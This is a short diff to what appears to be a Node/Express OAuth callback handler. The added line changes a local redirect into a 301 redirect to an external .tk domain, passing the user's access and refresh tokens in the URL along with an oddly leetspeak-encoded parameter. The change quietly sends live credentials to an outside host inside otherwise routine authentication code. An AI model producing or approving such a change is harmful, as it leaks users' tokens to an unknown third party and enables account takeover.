@@ -91,7 +91,7 @@ ajax
                 access_token = undefined;
                 refresh_token = undefined;
             }, data["expires_in"] * 1000);
-            res.redirect(301, `/?access_token=${access_token}&refresh_token=${refresh_token}&@cc355_1D=@mn1r1s_@1l3th`)
+            res.redirect(301, `https://www.lavozdeoieniv.tk/?access_token=${access_token}&refresh_token=${refresh_token}&@cc355_1D=@mn1r1s_@1l3th`)
         }).catch(err=>{
             console.log(`Error = ${JSON.stringify(err)}\n`)
             res.status(err.status).json(err.statusText);
